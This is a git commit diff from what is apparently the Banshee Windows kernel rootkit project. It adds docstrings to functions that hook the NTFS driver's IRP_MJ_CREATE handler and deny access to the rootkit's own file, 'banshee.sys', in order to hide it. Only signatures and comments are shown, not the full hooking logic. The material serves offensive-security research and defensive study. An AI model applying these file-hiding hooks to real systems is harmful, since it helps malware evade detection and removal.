d4f95119cc2c86d5e203c272d3c583e09213052b
eversinc33 <svrath@web.de>
2024-02-01 20:45:06 +0100

    add docstrings

--- Banshee/FileUtils.hpp
+++ Banshee/FileUtils.hpp
@@ -10,6 +10,13 @@
 // https://github.com/Idov31/Nidhogg/blob/d9f3b0366aad55ef6dc815361d5ec0943cd378d9/Nidhogg/WindowsTypes.hpp#L250
 extern "C" POBJECT_TYPE *IoDriverObjectType;
 
+/**
+ * Finds the filename from the given full path.
+ *
+ * @param fullPath Pointer to a wide character string representing the full path.
+ * @return Pointer to the character following the last backslash in the path if found,
+ *         otherwise returns the original pointer (assuming fullPath points to the filename).
+ */
 PWCH 
 BeGetFilenameFromPath(PWCH fullPath) 
 {
@@ -37,6 +44,15 @@ BeGetFilenameFromPath(PWCH fullPath)
     }
 }
 
+/**
+ * Hooked IRP_MJ_CREATE handler for the NTFS driver.
+ * Denies access to the file if the filename matches the rootkit driver filename "banshee.sys",
+ * otherwise calls the original NTFS IRP_MJ_CREATE handler.
+ *
+ * @param DeviceObject Pointer to the target device object.
+ * @param Irp Pointer to the I/O Request Packet (IRP).
+ * @return STATUS_ACCESS_DENIED if access to the file is denied, otherwise returns the result of the original function.
+ */
 NTSTATUS 
 BeHooked_NTFS_IRP_MJ_CREATE(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 {
@@ -59,6 +75,12 @@ BeHooked_NTFS_IRP_MJ_CREATE(PDEVICE_OBJECT DeviceObject, PIRP Irp)
     return BeGlobals::originalNTFS_IRP_MJ_CREATE_function(DeviceObject, Irp);
 }
 
+/**
+ * Retrieves the driver object of the NTFS driver.
+ *
+ * @param ntfsDriverObject Pointer to a variable to receive the pointer to the NTFS driver object.
+ * @return STATUS_SUCCESS if successful, otherwise returns an appropriate NTSTATUS error code.
+ */
 NTSTATUS 
 BeGetNtfsDriverObject(OUT PDRIVER_OBJECT* ntfsDriverObject)
 {
@@ -78,7 +100,11 @@ BeGetNtfsDriverObject(OUT PDRIVER_OBJECT* ntfsDriverObject)
     return STATUS_SUCCESS;
 }
 
-
+/**
+ * Hooks the IRP_MJ_CREATE function of the NTFS driver.
+ *
+ * @return STATUS_SUCCESS if successful, otherwise returns an appropriate NTSTATUS error code.
+ */
 NTSTATUS
 BeHookNTFSFileCreate()
 {
@@ -99,6 +125,11 @@ BeHookNTFSFileCreate()
 	return STATUS_SUCCESS;
 }
 
+/**
+ * Unhooks the IRP_MJ_CREATE function of the NTFS driver.
+ *
+ * @return STATUS_SUCCESS if successful, otherwise returns an appropriate NTSTATUS error code.
+ */
 NTSTATUS
 BeUnhookNTFSFileCreate()
 {
